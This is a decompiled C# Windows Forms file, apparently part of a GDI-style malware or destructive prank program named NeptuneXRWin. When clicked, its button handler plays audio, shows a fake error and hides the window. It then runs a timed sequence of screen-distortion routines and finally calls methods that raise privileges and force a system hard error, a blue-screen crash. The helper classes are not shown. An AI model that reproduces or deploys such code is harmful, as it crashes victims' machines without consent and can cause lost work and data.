using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace NeptuneXRWin
{
	// Token: 0x02000004 RID: 4
	public partial class Form1 : Form
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002378 File Offset: 0x00000578
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002390 File Offset: 0x00000590
		private void button2_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000239C File Offset: 0x0000059C
		private void button1_Click(object sender, EventArgs e)
		{
			Thread.Sleep(3000);
			new Thread(new ThreadStart(Beat.player)).Start();
			Thread.Sleep(500);
			new Thread(new ThreadStart(MONOXIDEERROR.Unknownerror)).Start();
			Thread.Sleep(1000);
			base.Hide();
			new Thread(new ThreadStart(GDI.Siney)).Start();
			new Thread(new ThreadStart(GDI.Inverter3)).Start();
			Thread.Sleep(25000);
			new Thread(new ThreadStart(GDI.GDIword)).Start();
			Thread.Sleep(27000);
			new Thread(new ThreadStart(GDI.LOL)).Start();
			new Thread(new ThreadStart(GDI.zoomer)).Start();
			Thread.Sleep(30000);
			new Thread(new ThreadStart(GDI.CUBE)).Start();
			new Thread(new ThreadStart(GDI.RAIN)).Start();
			new Thread(new ThreadStart(GDI.DrawLOLZ)).Start();
			new Thread(new ThreadStart(GDI.SHAKE)).Start();
			new Thread(new ThreadStart(GDI.Inverter)).Start();
			Thread.Sleep(20000);
			new Thread(new ThreadStart(GDI.Inverter2)).Start();
			new Thread(new ThreadStart(GDI.finalwarn)).Start();
			Thread.Sleep(32000);
			BSOD.RaisePrivilege();
			BSOD.CauseNtHardError();
		}
	}
}
